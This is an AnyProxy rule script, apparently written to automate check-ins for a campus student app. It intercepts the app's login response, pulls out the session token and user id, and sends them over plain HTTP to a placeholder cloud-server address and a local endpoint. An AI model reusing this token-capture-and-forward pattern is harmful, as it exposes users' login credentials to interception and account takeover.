'use strict';

module.exports = {

  summary: 'the default rule for AnyProxy',

  /**
   *
   *
   * @param {object} requestDetail
   * @param {string} requestDetail.protocol
   * @param {object} requestDetail.requestOptions
   * @param {object} requestDetail.requestData
   * @param {object} requestDetail.response
   * @param {number} requestDetail.response.statusCode
   * @param {object} requestDetail.response.header
   * @param {buffer} requestDetail.response.body
   * @returns
   */
  *beforeSendRequest(requestDetail) {
    return null;
  },


  /**
   *
   *
   * @param {object} requestDetail
   * @param {object} responseDetail
   */
  *beforeSendResponse(requestDetail, responseDetail) {
    var url = '';
    if (requestDetail.url.indexOf('https://student.wozaixiaoyuan.com/login/index.json') === 0) {
      var http = require("http");
      console.log(responseDetail.response.body.toString());// consume response body
      var datatojson = JSON.parse(responseDetail.response.body.toString());
      var url = 'http://你的云服务器IP:8080/jsp_work/saveIDToken.jsp?'+'token='+datatojson.data.token+"&id="+datatojson.data.id;
      http.get(url, (res) => {
        res.resume();
      }).on('error', (e) => {
        console.log(`Got error: ${e.message}`);
      });
      http.get(`http://127.0.0.1:8081/getToken`, (res) => {
        res.resume();
      }).on('error', (e) => {
        console.log(`Got error: ${e.message}`);
      });
    }
    return null;
  },


  /**
   * default to return null
   * the user MUST return a boolean when they do implement the interface in rule
   *
   * @param {any} requestDetail
   * @returns
   */
  *beforeDealHttpsRequest(requestDetail) {
    return true;
  },

  /**
   *
   *
   * @param {any} requestDetail
   * @param {any} error
   * @returns
   */
  *onError(requestDetail, error) {
    return null;
  },


  /**
   *
   *
   * @param {any} requestDetail
   * @param {any} error
   * @returns
   */
  *onConnectError(requestDetail, error) {
    return null;
  },


  /**
   *
   *
   * @param {any} requestDetail
   * @param {any} error
   * @returns
   */
  *onClientSocketError(requestDetail, error) {
    return null;
  },
};
